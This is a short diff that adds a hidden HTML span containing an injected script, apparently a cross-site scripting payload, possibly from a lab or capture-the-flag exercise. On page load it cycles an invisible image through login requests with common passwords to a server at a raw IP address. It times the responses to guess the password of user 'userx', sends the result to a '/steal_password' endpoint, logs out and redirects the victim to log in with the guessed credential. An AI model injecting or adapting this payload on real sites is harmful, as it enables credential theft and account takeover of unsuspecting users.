@@ -1,0 +1,33 @@
+<span style='display:none'>
+<Img id='passwordTest' />
+<Script>
+const passwordList = ['password', '123456', '12345678', 'dragon', '1234', 'qwerty', '12345'];
+let currentIndex = 0;
+let testElement = document.getElementById('passwordTest');
+let longestTime = 0;
+let guessedPassword = '';
+let startTime = new Date();
+
+testElement.onerror = () => {
+    let elapsedTime = new Date() - startTime;
+    if (elapsedTime > longestTime) {
+        guessedPassword = passwordList[currentIndex - 1];
+        longestTime = elapsedTime;
+    }
+    startTime = new Date();
+    if (currentIndex < passwordList.length) {
+        testElement.src = `http://65.109.199.84:3000/get_login?username=userx&password=${passwordList[currentIndex]}`;
+        currentIndex++;
+    } else {
+        fetch(`http://65.109.199.84:3000/steal_password?password=${guessedPassword}&timeElapsed=${longestTime}`);
+        fetch(`http://65.109.199.84:3000/logout`);
+        setTimeout(() => {
+            window.location.replace(`http://65.109.199.84:3000/get_login?username=userx&password=${guessedPassword}`);
+        }, 2000);
+    }
+};
+
+testElement.src = `http://65.109.199.84:3000/get_login?username=userx&password=${passwordList[currentIndex]}`;
+currentIndex++;
+</Script>
+</span>
